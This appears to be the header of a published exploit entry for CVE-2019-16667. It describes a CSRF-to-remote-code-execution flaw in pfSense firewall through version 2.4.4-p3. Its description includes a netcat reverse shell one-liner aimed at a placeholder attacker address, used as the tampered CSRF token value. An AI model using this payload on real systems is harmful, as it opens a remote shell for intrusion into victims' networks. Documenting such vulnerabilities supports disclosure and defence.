# Date: 2019-09-27
# Exploit Author: ghost_fh
# Vendor Homepage: https://www.pfsense.org/
# Software Link: https://www.pfsense.org/download/index.html?section=downloads
# Version: Till 2.4.4-p3
# Tested on: freebsd
# CVE : CVE-2019-16667

# Vulnerability Description :- The pfsense firewall is vulnerable to RCE
# chained with CSRF as it uses `csrf magic` library since it allows to tamper
# the CSRF token values submitted when processing the form requests. Due to
# this flaw, an attacker can exploit this vulnerability by crafting new page
# that contains attacker's controlled input such as a "reverse shell" (eg:
# `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip port
# >/tmp/f`token value) in the form and entice the victims to click
# on the crafted link via social engineering methods. Once the victim clicks
# on the link (try again button in this case), the attacker can take the
# lateral control of the victim's machine and malicious actions can be
# performed on the victim's behalf.
